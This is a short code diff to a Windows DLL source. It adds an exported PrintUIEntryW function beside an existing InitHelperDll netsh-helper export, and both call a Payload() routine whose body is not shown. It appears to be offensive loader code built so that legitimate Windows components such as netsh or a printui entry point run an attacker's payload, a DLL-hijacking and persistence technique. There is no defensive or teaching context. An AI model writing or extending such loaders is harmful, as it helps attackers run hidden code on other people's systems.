@@ -1,6 +1,7 @@
 #include "windows.h"
 #include <processthreadsapi.h>
 #include <memoryapi.h>
+#include <cstdint>
 
 #pragma comment(lib, "user32.lib")
 
@@ -29,4 +30,9 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved){
   Payload();
   return 0;
+}
+
+unsigned long PrintUIEntryW(struct HWND__* __ptr64 arg1, struct HINSTANCE__* __ptr64 arg2, uint16_t const* __ptr64 arg3, uint32_t arg4){
+	Payload();
+	return 0;
 }
